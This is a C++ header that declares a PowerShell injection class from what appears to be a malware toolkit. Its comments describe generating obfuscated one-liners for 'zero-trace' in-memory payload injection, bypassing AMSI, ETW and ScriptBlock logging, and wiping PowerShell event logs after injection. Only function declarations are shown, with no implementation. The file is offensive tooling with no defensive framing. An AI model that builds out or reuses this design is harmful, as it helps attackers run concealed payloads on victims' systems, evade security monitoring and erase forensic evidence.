#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <optional>

namespace l4g::injection {

struct PSInjectResult {
    bool success = false;
    DWORD pid = 0;
    std::string error;
};

class PowerShellInjector {
public:
    // Generate obfuscated PowerShell one-liner for zero-trace injection
    static std::string generate_onliner(const std::vector<uint8_t>& encrypted_payload, const std::string& key_b64);
    
    // Execute the PowerShell injection
    static PSInjectResult execute_injection(const std::string& ps_onliner);
    
    // Wipe PowerShell-related event logs after injection
    static bool wipe_powershell_traces(DWORD pid);
    
    // Create encoded command that decodes payload in memory
    static std::string create_encoded_command(const std::string& script);
    
    // Generate AMSI bypass + ETW bypass + ScriptBlock logging bypass
    static std::string generate_bypass_stub();
    
private:
    static std::string obfuscate_script(const std::string& script);
    static std::string generate_random_var_name();
};

} // namespace l4g::injection